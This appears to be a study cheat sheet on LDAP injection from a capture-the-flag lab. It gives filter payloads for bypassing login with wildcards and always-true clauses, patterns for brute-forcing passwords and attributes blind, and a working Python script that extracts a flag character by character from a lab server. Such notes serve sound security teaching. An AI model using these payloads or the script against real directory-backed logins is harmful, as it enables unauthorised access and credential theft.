# LDAP Injection

- Lightweight Directory Access Protocol (LDAP) is a protocol used to access directory servers such as Active Directory (AD).
- Web applications may use LDAP for integration with AD or other directory services for authentication or data retrieval purposes. 

### Authentication Bypass

- We can use wildcard `*` to bypass the authentication.

```ldap
# Password Bypass
(&(uid=admin)(userPassword=*))

# When you dont know username and password
# Probably login to first user account
(&(uid=*)(userPassword=*))

# If dont know full username
(&(uid=admin*)(userPassword=*)) 
```

- We can bypass authentication without using wildcards using the following method:

```ldap
(&(uid=<valid_username>)(|(&)(userPassword=randompassword)))
```


### Blind Data Exfiltration

- We can brute force the value of the attribute using following method:

```ldap
# Brute force password
(&(uid=admin)(password=p*))
(&(uid=admin)(password=p@*))

# We can get value of other attributes
(&(uid=htb-stdnt)(|(description=*)(password=invalid)))
```

> Most LDAP attributes are case-insensitive. So if we need the correct casing, for instance, for passwords, we might have to brute-force it.


### Sample Automation Script

```python
import requests

def main():
    url = "http://94.237.120.119:33549/index.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payloads = [
        "a","b","c","d","e","f","g","h","i","j","k","l","m",
        "n","o","p","q","r","s","t","u","v","w","x","y","z",
        "0","1","2","3","4","5","6","7","8","9",
        "@","{","}"
    ]

    username_payload = 'admin)(|(description='

    print('Attacking ' + url)

    while True:
        for payload in payloads:
            data = {
                "username": username_payload + payload + '*',
                "password": 'invalid)'
            }

            response = requests.post(url, headers=headers, data=data, allow_redirects=False)

            if "Login successful" in response.text:
                username_payload = username_payload + payload
                print('Retrieved Data: ', username_payload)

                if payload == '}':
                    username_payload = username_payload.replace("admin)(|(description=", "")
                    print('Attack Completed. The flag is :' + username_payload)
                    return

                break


if __name__ == "__main__":
    main()
```